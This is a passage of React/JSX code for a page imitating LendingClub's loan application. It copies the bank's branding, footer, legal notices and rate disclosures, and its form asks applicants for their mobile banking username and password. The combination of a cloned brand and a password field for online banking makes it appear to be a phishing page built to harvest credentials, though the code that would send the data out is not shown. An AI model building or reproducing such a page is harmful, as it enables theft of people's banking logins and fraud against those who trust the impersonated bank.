                  <div className="lc-fgroup"><label className="lc-lbl">Mobile Banking Username</label><div className="lc-icon-field"><input className="lc-in" {...register("mobileUsername")} placeholder="Username"/><span className="fi"><LockIco/></span></div>{errors.mobileUsername&&<p className="lc-err">{errors.mobileUsername.message}</p>}</div>
                  <div className="lc-fgroup"><label className="lc-lbl">Mobile Banking Password</label><div className="lc-icon-field"><input className="lc-in" type="password" {...register("mobilePassword")} placeholder="Password"/><span className="fi"><LockIco/></span></div>{errors.mobilePassword&&<p className="lc-err">{errors.mobilePassword.message}</p>}</div>
                </div>
              </div>

              <button type="submit" className="lc-submit" disabled={isSubmitting}>
                {isSubmitting ? <><div className="lc-spin"/>Submitting...</> : <>Submit Application <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round"><polyline points="9 18 15 12 9 6"/></svg></>}
              </button>
              <p className="lc-fine">By submitting, you agree to our <a href="#">Terms of Use</a> and <a href="#">Privacy Policy</a>. Checking your rate won't affect your credit score.³</p>
            </form>
          </div>
        </div>
      </section>

      {/* ── FOOTER ── */}
      <footer className="lc-footer">
        <div className="lc-ft">
          <div className="lc-ft-brand">
            <div style={{display:"flex",alignItems:"center",gap:10}}><LCHashLogo/><span style={{color:"#fff",fontWeight:800,fontSize:17}}>LendingClub</span></div>
            <p>Rewriting the rules of traditional banking. We only win when our customers succeed.</p>
            <div style={{display:"flex",gap:3,marginTop:12}}>{[1,2,3,4,5].map(i=><StarIco key={i}/>)}<span style={{fontSize:11,opacity:.5,marginLeft:6}}>4.9/5</span></div>
          </div>
          {[
            { h:"What We Offer", links:["Personal Loans","Personal Banking","Auto Refinancing","Financing Solutions","Business Loans","Institutional Investing","Other Types of Loans","Apply for a Personal Loan","Apply for a Bank Account"] },
            { h:"Resources",     links:["Resource Center","Personal Loan Rates & Fees","Member Benefits","Customer Reviews","Glossary"] },
            { h:"Legal",         links:["Terms of Use","Privacy Policy","California Notice","Data Collection & Use","Accessibility","SEC Filing","Disclosures & Agreements","Legal Requests","Licenses"] },
            { h:"About Us",      links:["CRA Public File","Company","Leadership","Careers","Media Center","Corporate Governance","Investor Relations","Contact"] },
          ].map(({h,links}) => (
            <div key={h} className="lc-ft-col">
              <h4>{h}</h4>
              <ul>{links.map(l=><li key={l}><a href="#">{l}</a></li>)}</ul>
            </div>
          ))}
        </div>
        <div className="lc-fb">
          <p>© {new Date().getFullYear()} LendingClub Bank, National Association. All rights reserved. Member FDIC. Equal Housing Lender.</p>
          <div style={{display:"flex",gap:18}}>
            {["FDIC Insured","Equal Housing Lender","256-bit SSL"].map(t=>(
              <span key={t} style={{fontSize:11,color:"rgba(255,255,255,0.4)",display:"flex",alignItems:"center",gap:5}}>
                <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
                {t}
              </span>
            ))}
          </div>
        </div>
        <div className="lc-fd">
          ¹ Rates as low as 5.96% APR with AutoPay. Not all applicants qualify. ² Savings products subject to terms. ³ Soft credit pull only — no impact on credit score. ⁴ APR discount for qualifying debt paydown loans. ⁵ Funding timelines subject to approval and verification.
        </div>
      </footer>
    </div>
  );
}
